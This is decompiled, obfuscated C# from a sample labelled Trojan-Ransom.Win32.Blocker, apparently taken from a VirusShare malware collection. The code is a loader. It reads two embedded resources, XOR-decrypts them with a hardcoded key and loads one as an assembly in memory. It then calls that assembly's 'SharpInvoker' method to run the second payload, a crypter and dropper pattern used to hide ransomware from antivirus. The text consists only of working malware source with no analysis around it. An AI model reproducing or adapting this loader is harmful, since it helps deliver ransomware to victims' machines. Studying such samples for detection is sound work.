// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5555, Version=0.0.0.0, Culture=neutral, PublicKeyToken=f1fbbd7db53bfdb4
// MVID: 0D11B329-2752-44F3-ACE5-4122455C2392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.arpc-0c7d5e5565ff7304f705e1aeb4d7e4e31ffcea64aa2ae579695a932615bbef73.exe

using \u0008;
using \u000E;
using \u000F;
using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;

namespace \u000F
{
  internal sealed class \u0005
  {
    private static void \u0002()
    {
      ResourceManager resourceManager;
      string str1;
      byte[] numArray1;
      string str2;
      byte[] numArray2;
      try
      {
        try
        {
          while (\u0004.\u0002())
          {
            if (true)
            {
              if (true)
                resourceManager = new ResourceManager("myres", \u0091\u0004.\u0013\u0005());
              str1 = (string) resourceManager.GetObject("fileread");
            }
            string str3 = (string) resourceManager.GetObject("peread");
            if (true)
              goto label_10;
label_5:
            if (true)
            {
              \u0018\u0003.\u007E\u009D\u0005((object) resourceManager);
              numArray1 = \u0005.\u0002(\u009E\u0004.\u007E\u0096\u0005((object) \u009D\u0004.\u0097\u0005(), str1), "myshittykey");
              if (false)
                break;
              numArray2 = \u0005.\u0002(\u009E\u0004.\u007E\u0096\u0005((object) \u009D\u0004.\u0097\u0005(), str2), "myshittykey");
              \u0005.\u0002(numArray2, numArray1);
              break;
            }
            continue;
label_10:
            str2 = str3;
            goto label_5;
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[5]
        {
          (object) resourceManager,
          (object) str1,
          (object) str2,
          (object) numArray1,
          (object) numArray2
        };
        \u0005.\u0002(ex, objArray);
      }
    }

    public static void \u0002([In] byte[] obj0, [In] byte[] obj1)
    {
      Type[] typeArray;
      int index1;
      Type type;
      MethodInfo[] methodInfoArray1;
      MethodInfo[] methodInfoArray2;
      int index2;
      MethodInfo methodInfo;
      object[] objArray1;
      Assembly assembly;
      Type[] types;
      try
      {
        assembly = Assembly.Load(obj0);
        if (true)
          goto label_13;
label_10:
        for (; index2 < methodInfoArray2.Length; ++index2)
        {
          methodInfo = methodInfoArray2[index2];
          if (\u001F\u0003.\u007E\u008D((object) \u0008\u0003.\u007E\u0017((object) methodInfo), "SharpInvoker"))
          {
            if (true)
              objArray1 = new object[3]
              {
                (object) true,
                (object) \u0008\u0003.\u007E\u0015\u0005((object) \u0091\u0004.\u0013\u0005()),
                null
              };
            objArray1[2] = (object) obj1;
            object obj = \u0097\u0004.\u007E\u0082\u0005((object) methodInfo, (object) null, objArray1);
          }
        }
label_11:
        ++index1;
label_12:
        while (index1 < typeArray.Length)
        {
          type = typeArray[index1];
          while (\u001F\u0003.\u007E\u008D((object) \u0008\u0003.\u007E\u0017((object) type), "Sharpvtwo"))
          {
            methodInfoArray1 = \u0019\u0004.\u007E\u0081\u0003((object) type);
            if (true)
            {
              methodInfoArray2 = methodInfoArray1;
              index2 = 0;
              if (true)
                goto label_10;
            }
            else
              goto label_12;
          }
          goto label_11;
        }
        return;
label_13:
        types = assembly.GetTypes();
        typeArray = types;
        index1 = 0;
        goto label_12;
      }
      catch (Exception ex)
      {
        object[] objArray2 = new object[12]
        {
          (object) assembly,
          (object) types,
          (object) type,
          (object) methodInfoArray1,
          (object) methodInfo,
          (object) objArray1,
          (object) typeArray,
          (object) index1,
          (object) methodInfoArray2,
          (object) index2,
          (object) obj0,
          (object) obj1
        };
        \u0005.\u0002(ex, objArray2);
        throw;
      }
    }

    public static byte[] \u0002([In] byte[] obj0, [In] string obj1)
    {
      int index;
      byte[] bytes;
      int num;
      try
      {
        num = 350;
        bytes = \u009D\u0004.\u0095\u0005().GetBytes(obj1);
        for (index = 0; index < obj0.Length; ++index)
          obj0[index] ^= (byte) ((int) bytes[index % bytes.Length] >> index + num + bytes.Length & (int) byte.MaxValue);
        return obj0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num;
        byte[] numArray1 = bytes;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) index;
        byte[] numArray2 = obj0;
        string str = obj1;
        \u0005.\u0002(ex, (object) local1, (object) numArray1, (object) local2, (object) numArray2, (object) str);
        throw;
      }
    }

    public \u0005()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0005.\u0002(ex, (object) this);
        throw;
      }
    }
  }
}
